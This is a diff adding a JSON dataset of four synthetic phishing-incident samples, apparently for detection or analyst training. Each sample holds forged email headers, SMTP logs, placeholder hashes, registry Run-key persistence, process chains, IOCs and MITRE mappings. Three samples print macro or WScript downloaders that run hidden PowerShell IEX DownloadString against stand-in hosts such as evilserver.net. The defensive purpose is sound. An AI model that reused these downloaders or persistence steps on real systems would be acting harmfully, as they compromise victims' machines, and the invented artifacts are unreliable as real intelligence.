@@ -1,0 +1,213 @@
+{
+  "samples": [
+    {
+      "scenario": "Phishing email impersonating HR department delivers weaponized Microsoft Word document with embedded VBA macro that executes on document open, downloading and executing remote payload, resulting in system compromise.",
+      "technical_data": {
+        "email_headers": "Return-Path: <hr-notify@company-secure.net>\r\nReceived: from mail.company-secure.net (mail.company-secure.net [203.0.113.55])\r\n\tby mx.enterprise.com (Postfix) with ESMTPS id 7890EFGH12\r\n\tfor <employee@enterprise.com>; Fri, 02 Jun 2023 09:55:12 +0000 (UTC)\r\nReceived-SPF: pass (enterprise.com: domain of hr-notify@company-secure.net designates 203.0.113.55 as permitted sender) receiver=mx.enterprise.com; client-ip=203.0.113.55; envelope-from=hr-notify@company-secure.net; helo=mail.company-secure.net;\r\nAuthentication-Results: mx.enterprise.com; dkim=pass header.d=company-secure.net; spf=pass smtp.mailfrom=hr-notify@company-secure.net; dmarc=pass (p=quarantine) header.from=company-secure.net\r\nMessage-ID: <DDF23423423df@company-secure.net>\r\nDate: Fri, 02 Jun 2023 09:55:11 +0000\r\nFrom: \"HR Department\" <hr-notify@company-secure.net>\r\nTo: employee@enterprise.com\r\nSubject: Updated Employee Policy Document - Immediate Review Required\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_789123_4567890.1685705711\"\r\nX-Mailer: Microsoft Outlook 16.0\r\nX-Spam-Status: No\r\nX-Enterprise-MailScanner-SpamCheck: Not spam, score=-0.5\r\nX-Enterprise-MailScanner-Info: Found to be clean",
+        "email_body": "------=_Part_789123_4567890.1685705711\r\nContent-Type: text/plain; charset=\"UTF-8\"\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\nDear Employee,\r\n\r\nPlease find attached the updated employee policy document. It is imperative that you= review the changes by the end of the day.\r\n\r\nBest regards,\r\nHR Department\r\n------=_Part_789123_4567890.1685705711\r\nContent-Type: application/msword; name=\"Employee_Policy_Update.docm\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"Employee_Policy_Update.docm\"\r\n\r\nTVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9n\r\ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAKR6mJ57uF3N\r\n... [truncated base64 of macro-enabled Word document] ...\r\n------=_Part_789123_4567890.1685705711--",
+        "smtp_transaction_log": "220 mail.company-secure.net ESMTP Postfix\r\nEHLO mail.company-secure.net\r\n250-mail.company-secure.net\r\n250-PIPELINING\r\n250-SIZE 10485760\r\n250-ETRN\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<hr-notify@company-secure.net>\r\n250 2.1.0 Ok\r\nRCPT TO:<employee@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: \"HR Department\" <hr-notify@company-secure.net>\r\nTo: employee@enterprise.com\r\nSubject: Updated Employee Policy Document - Immediate Review Required\r\n...\r\n.\r\n250 2.0.0 Ok: queued as 7890EFGH12",
+        "attachment_hashes": {
+          "md5": "b2c3d4e5f67890123456789abcdef123",
+          "sha1": "d5e6f7a8b9c0123456789abcdef1234567890123",
+          "sha256": "98a3b7c1d2f3e4a5b6c7d8e9f0a1b2c3d4e5f6789abcdeffedcba9876543210a"
+        },
+        "macro_code_snippet": "Sub Document_Open()\r\n    Dim strCmd As String\r\n    strCmd = \"cmd.exe /c powershell -windowstyle hidden -nop -c \\\"IEX (New-Object Net.WebClient).DownloadString('http://evilserver.net/loader.ps1')\\\"\"\r\n    Shell strCmd, vbHide\r\nEnd Sub",
+        "registry_artifacts": "HKCU\\Software\\Microsoft\\Office\\Word\\Security\\AccessVBOM = 1\r\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OfficeUpdate = \"C:\\Users\\employee\\AppData\\Roaming\\Microsoft\\OfficeUpdate\\office.exe\"",
+        "process_chain": [
+          "explorer.exe -> winword.exe (Employee_Policy_Update.docm opened) -> cmd.exe -> powershell.exe -windowstyle hidden -nop -c IEX ... -> downloader payload"
+        ],
+        "network_traffic": "GET /loader.ps1 HTTP/1.1\r\nHost: evilserver.net\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n",
+        "dns_queries": [
+          "evilserver.net A 203.0.113.99"
+        ],
+        "domain_registration": {
+          "domain": "company-secure.net",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2023-05-10T07:12:00Z",
+          "expiration_date": "2024-05-10T07:12:00Z",
+          "name_servers": [
+            "ns1.godaddy.com",
+            "ns2.godaddy.com"
+          ],
+          "registrant_country": "CN"
+        }
+      },
+      "indicators": {
+        "suspicious_sender_domain": "company-secure.net (recently registered, mimics internal HR domain)",
+        "attachment_type": "Word macro-enabled document (.docm) with AutoOpen macro",
+        "macro command": "cmd.exe /c powershell -windowstyle hidden -nop -c IEX (New-Object Net.WebClient).DownloadString(...)",
+        "network_ioc": "HTTP GET to http://evilserver.net/loader.ps1",
+        "file_hashes": {
+          "md5": "b2c3d4e5f67890123456789abcdef123"
+        },
+        "registry_persistence": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OfficeUpdate",
+        "process_behavior": "winword.exe spawning hidden powershell download and execution of remote script"
+      },
+      "detection_method": "Sandbox detonation of .docm attachment showed macro launching hidden PowerShell command to download external script; Endpoint detection observed suspicious process tree involving Word and cmd.exe; Network IDS flagged HTTP GET to known malicious domain; Phishing simulation and user report triggered incident response.",
+      "relevant_mitre_techniques": [
+        "T1193 - Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.001 - Command and Scripting Interpreter: PowerShell",
+        "T1105 - Ingress Tool Transfer",
+        "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+      ]
+    },
+    {
+      "scenario": "Targeted phishing email from spoofed logistics vendor delivers weaponized RTF document exploiting Equation Editor vulnerability to execute shellcode that downloads backdoor payload.",
+      "technical_data": {
+        "email_headers": "Return-Path: <logistics@fastshipments.com>\r\nReceived: from mail.fastshipments.com (mail.fastshipments.com [192.0.2.150])\r\n\tby mail.enterprise.net (Postfix) with ESMTPS id 3456IJKL78\r\n\tfor <procurement@enterprise.net>; Mon, 15 May 2023 11:30:55 +0000 (UTC)\r\nReceived-SPF: pass (enterprise.net: domain of logistics@fastshipments.com designates 192.0.2.150 as permitted sender) receiver=mail.enterprise.net; client-ip=192.0.2.150; envelope-from=logistics@fastshipments.com; helo=mail.fastshipments.com;\r\nAuthentication-Results: mail.enterprise.net; dkim=pass header.d=fastshipments.com; spf=pass smtp.mailfrom=logistics@fastshipments.com; dmarc=pass (p=none) header.from=fastshipments.com\r\nMessage-ID: <LKJ345345LKJ@fastshipments.com>\r\nDate: Mon, 15 May 2023 11:30:53 +0000\r\nFrom: \"Fast Shipments\" <logistics@fastshipments.com>\r\nTo: procurement@enterprise.net\r\nSubject: Shipment Details and Invoice\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_456789_1234567.1684159853\"\r\nX-Mailer: Microsoft Outlook 16.0\r\nX-Spam-Status: No\r\nX-Enterprise-MailScanner-SpamCheck: Not spam, score=-0.9\r\nX-Enterprise-MailScanner-Info: Found to be clean",
+        "email_body": "------=_Part_456789_1234567.1684159853\r\nContent-Type: text/plain; charset=\"UTF-8\"\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\nDear Procurement Team,\r\n\r\nPlease find attached the shipment details and invoice for the recent order. Kindly=0Aprocess the payment promptly.\r\n\r\nRegards,\r\nFast Shipments\r\n------=_Part_456789_1234567.1684159853\r\nContent-Type: application/rtf; name=\"Shipment_Invoice.rtf\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"Shipment_Invoice.rtf\"\r\n\r\ne1xydGYxXGFuc2lcYmVnaW57XGVxdWF0aW9uX2VkaXRvcn0NCiVcY29sb3J7Ymx1ZX0gXHZpZGVv\r\nX3tPcmRlcn5cYW5zaWRlcjB9DQpcY29sb3J7YmxhY2t9IFxzdHlsZXtcbGluZXBhcmFnfSBcZm9u\r\ndHtjYWxpYnJ9IFxmb250d2VpZ2h0ezEwfQ0KXGVxdWF0aW9uX2VkaXRvcnsgXHBhcmF9DQp9DQp7\r\nc2hlbGxjb2RlIGV4cGxvaXQgYmFzZSA2NCBieXRlcyB0b2RheSB3bGsgc2hlbGxjb2RlIGhlcmUg\r\nfQ==\r\n------=_Part_456789_1234567.1684159853--",
+        "smtp_transaction_log": "220 mail.fastshipments.com ESMTP Postfix\r\nEHLO mail.fastshipments.com\r\n250-mail.fastshipments.com\r\n250-PIPELINING\r\n250-SIZE 10485760\r\n250-ETRN\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<logistics@fastshipments.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<procurement@enterprise.net>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: \"Fast Shipments\" <logistics@fastshipments.com>\r\nTo: procurement@enterprise.net\r\nSubject: Shipment Details and Invoice\r\n...\r\n.\r\n250 2.0.0 Ok: queued as 3456IJKL78",
+        "attachment_hashes": {
+          "md5": "c3d4e5f67890123456789abcdef123456",
+          "sha1": "e6f7a8b9c0123456789abcdef123456789012345",
+          "sha256": "a4b5c6d7e8f9a0b1c2d3e4f506172839405060708091a2b3c4d5e6f708192837"
+        },
+        "macro_code_snippet": "Exploit code embedded in RTF exploiting CVE-2017-11882 vulnerability to execute shellcode that launches powershell.exe to download and execute backdoor from http://malicious-ship.net/backdoor.exe",
+        "registry_artifacts": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\ShipUpdater = \"C:\\Users\\procurement\\AppData\\Local\\Temp\\shipupdater.exe\"",
+        "process_chain": [
+          "explorer.exe -> winword.exe (Shipment_Invoice.rtf opened) -> eqnedt32.exe (Equation Editor exploit) -> powershell.exe -nop -w hidden -c IEX ... -> downloader payload"
+        ],
+        "network_traffic": "GET /backdoor.exe HTTP/1.1\r\nHost: malicious-ship.net\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n",
+        "dns_queries": [
+          "malicious-ship.net A 192.0.2.200"
+        ],
+        "domain_registration": {
+          "domain": "fastshipments.com",
+          "registrar": "Google LLC",
+          "creation_date": "2023-03-20T15:45:00Z",
+          "expiration_date": "2024-03-20T15:45:00Z",
+          "name_servers": [
+            "ns-cloud1.googledomains.com",
+            "ns-cloud2.googledomains.com"
+          ],
+          "registrant_country": "BR"
+        }
+      },
+      "indicators": {
+        "suspicious_sender_domain": "fastshipments.com (recently registered, impersonates legitimate logistics vendor)",
+        "attachment_type": "RTF document exploiting Equation Editor vulnerability (CVE-2017-11882)",
+        "macro command": "shellcode executed via Equation Editor exploit launching hidden powershell downloader",
+        "network_ioc": "HTTP GET to http://malicious-ship.net/backdoor.exe",
+        "file_hashes": {
+          "md5": "c3d4e5f67890123456789abcdef123456"
+        },
+        "registry_persistence": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\ShipUpdater",
+        "process_behavior": "winword.exe exploited via eqnedt32.exe to run shellcode spawning hidden powershell downloader"
+      },
+      "detection_method": "Exploit detection signatures triggered on RTF attachment with known CVE-2017-11882 shellcode; Endpoint detection observed unusual eqnedt32.exe process spawning powershell with network activity; Network IDS detected HTTP GET to suspicious domain; User reported unexpected shipment invoice email leading to security investigation.",
+      "relevant_mitre_techniques": [
+        "T1193 - Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1203 - Exploitation for Client Execution",
+        "T1059.001 - Command and Scripting Interpreter: PowerShell",
+        "T1105 - Ingress Tool Transfer",
+        "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+      ]
+    },
+    {
+      "scenario": "Targeted phishing email delivers weaponized Microsoft Word document with embedded VBA macro that triggers on document open, executing hidden PowerShell commands to download and execute ransomware payload.",
+      "technical_data": {
+        "email_headers": "Return-Path: <security@invoice-updates.com>\r\nReceived: from mail.invoice-updates.com (mail.invoice-updates.com [203.0.113.77])\r\n\tby mx.enterprise.com (Postfix) with ESMTPS id 9876EFGH12\r\n\tfor <employee@enterprise.com>; Thu, 15 Jun 2023 09:15:37 +0000 (UTC)\r\nReceived-SPF: pass (enterprise.com: domain of security@invoice-updates.com designates 203.0.113.77 as permitted sender) receiver=mx.enterprise.com; client-ip=203.0.113.77; envelope-from=security@invoice-updates.com; helo=mail.invoice-updates.com;\r\nAuthentication-Results: mx.enterprise.com; dkim=pass header.d=invoice-updates.com; spf=pass smtp.mailfrom=security@invoice-updates.com; dmarc=pass (p=none) header.from=invoice-updates.com\r\nMessage-ID: <DEF45WER234asdfsdf@invoice-updates.com>\r\nDate: Thu, 15 Jun 2023 09:15:35 +0000\r\nFrom: \"Invoice Updates\" <security@invoice-updates.com>\r\nTo: employee@enterprise.com\r\nSubject: Updated Invoice Document - Action Required\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_654321_0987654.1686828937\"\r\nX-Mailer: Microsoft Outlook 16.0\r\nX-Spam-Status: No\r\nX-Enterprise-MailScanner-SpamCheck: Not spam, score=-0.8\r\nX-Enterprise-MailScanner-Info: Found to be clean",
+        "email_body": "------=_Part_654321_0987654.1686828937\r\nContent-Type: text/plain; charset=\"utf-8\"\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\nDear Accounting Team,\r\n\r\nPlease find attached the updated invoice for your review. Kindly open the document and approve the payment to avoid late fees.\r\n\r\nBest regards,\r\nInvoice Updates Team\r\n------=_Part_654321_0987654.1686828937\r\nContent-Type: application/msword; name=\"Invoice_June2023.docm\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"Invoice_June2023.docm\"\r\n\r\nU29tZSBiYXNlNjQgZW5jb2RlZCB3b3JkIGRvY3VtZW50IGNvbnRlbnQgd2l0aCBtYWx3YXJlIG1hY3JvLg==\r\n------=_Part_654321_0987654.1686828937--",
+        "smtp_transaction_log": "220 mail.invoice-updates.com ESMTP Postfix\r\nEHLO mail.invoice-updates.com\r\n250-mail.invoice-updates.com\r\n250-PIPELINING\r\n250-SIZE 10485760\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<security@invoice-updates.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<employee@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: \"Invoice Updates\" <security@invoice-updates.com>\r\nTo: employee@enterprise.com\r\nSubject: Updated Invoice Document - Action Required\r\n...\r\n.\r\n250 2.0.0 Ok: queued as 9876EFGH12",
+        "attachment_hashes": {
+          "md5": "f2e3d4c5b6a7980123456789abcdef01",
+          "sha1": "a1b2c3d4e5f67890123456789abcdef012345678",
+          "sha256": "d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2"
+        },
+        "macro_code_snippet": "Sub Document_Open()\r\n    Dim cmd As String\r\n    cmd = \"powershell.exe -NoProfile -WindowStyle Hidden -Command \\\"IEX(New-Object Net.WebClient).DownloadString('http://evil-domain.net/ransomware.ps1')\\\"\"\r\n    Shell cmd, vbHide\r\nEnd Sub",
+        "registry_artifacts": "HKCU\\Software\\Microsoft\\Office\\Word\\Security\\AccessVBOM = 1\r\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\InvoiceUpdater = \"C:\\Users\\employee\\AppData\\Roaming\\Microsoft\\InvoiceUpdater\\invupdater.exe\"",
+        "process_chain": [
+          "explorer.exe -> winword.exe (Invoice_June2023.docm opened) -> powershell.exe -NoProfile -WindowStyle Hidden -Command IEX ... -> cmd.exe -> ransomware payload execution"
+        ],
+        "network_traffic": "GET /ransomware.ps1 HTTP/1.1\r\nHost: evil-domain.net\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n",
+        "dns_queries": [
+          "evil-domain.net A 203.0.113.99"
+        ],
+        "domain_registration": {
+          "domain": "invoice-updates.com",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2023-05-20T08:30:00Z",
+          "expiration_date": "2024-05-20T08:30:00Z",
+          "name_servers": [
+            "ns1.godaddy.com",
+            "ns2.godaddy.com"
+          ],
+          "registrant_country": "CN"
+        }
+      },
+      "indicators": {
+        "suspicious_sender_domain": "invoice-updates.com (recently registered, mimics billing service)",
+        "attachment_type": "Word macro-enabled document (.docm) with Document_Open macro",
+        "macro command": "powershell.exe -NoProfile -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString(...)",
+        "network_ioc": "HTTP GET to http://evil-domain.net/ransomware.ps1",
+        "file_hashes": {
+          "md5": "f2e3d4c5b6a7980123456789abcdef01"
+        },
+        "registry_persistence": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\InvoiceUpdater",
+        "process_behavior": "winword.exe spawning hidden PowerShell with remote script download and execution"
+      },
+      "detection_method": "Sandboxing at email gateway detected macro-enabled Word document executing PowerShell download commands; endpoint detection identified process chain from Word to PowerShell with suspicious network activity; network IDS alerted on HTTP requests to known malicious domain; user reported suspicious invoice email leading to investigation.",
+      "relevant_mitre_techniques": [
+        "T1193 - Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.001 - Command and Scripting Interpreter: PowerShell",
+        "T1105 - Ingress Tool Transfer",
+        "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+      ]
+    },
+    {
+      "scenario": "Phishing email with weaponized compressed archive containing JavaScript file that auto-executes to download and install backdoor malware on victim workstation.",
+      "technical_data": {
+        "email_headers": "Return-Path: <support@billing-secure.com>\r\nReceived: from mail.billing-secure.com (mail.billing-secure.com [192.0.2.150])\r\n\tby mx.corporate.net (Postfix) with ESMTPS id 5678IJKL90\r\n\tfor <user@corporate.net>; Mon, 27 Mar 2023 12:45:20 +0000 (UTC)\r\nReceived-SPF: pass (corporate.net: domain of support@billing-secure.com designates 192.0.2.150 as permitted sender) receiver=mx.corporate.net; client-ip=192.0.2.150; envelope-from=support@billing-secure.com; helo=mail.billing-secure.com;\r\nAuthentication-Results: mx.corporate.net; dkim=pass header.d=billing-secure.com; spf=pass smtp.mailfrom=support@billing-secure.com; dmarc=pass (p=none) header.from=billing-secure.com\r\nMessage-ID: <GHI67JKL890asdfas@billing-secure.com>\r\nDate: Mon, 27 Mar 2023 12:45:18 +0000\r\nFrom: \"Billing Support\" <support@billing-secure.com>\r\nTo: user@corporate.net\r\nSubject: Invoice Update Attached\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_789654_3219876.1679929518\"\r\nX-Mailer: Mozilla Thunderbird 91.5.0\r\nX-Spam-Status: No\r\nX-Corporate-MailScanner-SpamCheck: Not spam, score=-0.5\r\nX-Corporate-MailScanner-Info: Found to be clean",
+        "email_body": "------=_Part_789654_3219876.1679929518\r\nContent-Type: text/plain; charset=\"utf-8\"\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\nDear Customer,\r\n\r\nPlease find the updated invoice attached for your review. Kindly extract the files and run the included script to update your billing information.\r\n\r\nThank you,\r\nBilling Support Team\r\n------=_Part_789654_3219876.1679929518\r\nContent-Type: application/zip; name=\"InvoiceUpdate.zip\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"InvoiceUpdate.zip\"\r\n\r\nUEsDBBQAAAAIAAeLbVQAAAAAAAAAAAAAAAALABwAaW5mb3JtYXRpb25zLmpzVVQJAAPqk0Bc+pNAX\r\n... [truncated base64 for malicious JavaScript inside zip] ...\r\n------=_Part_789654_3219876.1679929518--",
+        "smtp_transaction_log": "220 mail.billing-secure.com ESMTP Postfix\r\nEHLO mail.billing-secure.com\r\n250-mail.billing-secure.com\r\n250-PIPELINING\r\n250-SIZE 5242880\r\n250-AUTH LOGIN PLAIN\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<support@billing-secure.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<user@corporate.net>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: \"Billing Support\" <support@billing-secure.com>\r\nTo: user@corporate.net\r\nSubject: Invoice Update Attached\r\n...\r\n.\r\n250 2.0.0 Ok: queued as 5678IJKL90",
+        "attachment_hashes": {
+          "md5": "c4d3e2f1a9b876543210fedcba987654",
+          "sha1": "b1c2d3e4f5a67890123456789abcdef123456789",
+          "sha256": "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899"
+        },
+        "macro_code_snippet": "var WshShell = WScript.CreateObject(\"WScript.Shell\");\r\nWshShell.Run(\"powershell -Command \\\"IEX(New-Object Net.WebClient).DownloadString('http://malicious-server.biz/backdoor.ps1')\\\"\");",
+        "registry_artifacts": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\BillingUpdate = \"C:\\Users\\user\\AppData\\Roaming\\BillingUpdate\\update.exe\"",
+        "process_chain": [
+          "explorer.exe -> wscript.exe (runs information.js) -> powershell.exe -Command IEX ... -> backdoor payload execution"
+        ],
+        "network_traffic": "GET /backdoor.ps1 HTTP/1.1\r\nHost: malicious-server.biz\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n",
+        "dns_queries": [
+          "malicious-server.biz A 192.0.2.200"
+        ],
+        "domain_registration": {
+          "domain": "billing-secure.com",
+          "registrar": "Tucows Domains Inc.",
+          "creation_date": "2023-02-10T11:00:00Z",
+          "expiration_date": "2024-02-10T11:00:00Z",
+          "name_servers": [
+            "ns1.tucows.com",
+            "ns2.tucows.com"
+          ],
+          "registrant_country": "UA"
+        }
+      },
+      "indicators": {
+        "suspicious_sender_domain": "billing-secure.com (recently registered, impersonates billing department)",
+        "attachment_type": "ZIP archive containing JavaScript file that executes on extraction",
+        "macro command": "WScript Shell executing PowerShell command to download remote script",
+        "network_ioc": "HTTP GET to http://malicious-server.biz/backdoor.ps1",
+        "file_hashes": {
+          "md5": "c4d3e2f1a9b876543210fedcba987654"
+        },
+        "registry_persistence": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\BillingUpdate",
+        "process_behavior": "wscript.exe executing JS file that spawns hidden PowerShell downloader"
+      },
+      "detection_method": "Email security gateway sandboxing detected ZIP archive with JavaScript executing PowerShell download; endpoint EDR alerted on wscript.exe spawning PowerShell with network connections; network monitoring identified HTTP requests to known malicious domain; user reported suspicious update email prompting investigation.",
+      "relevant_mitre_techniques": [
+        "T1193 - Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.003 - Command and Scripting Interpreter: Windows Command Shell",
+        "T1105 - Ingress Tool Transfer",
+        "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+      ]
+    }
+  ]
+}
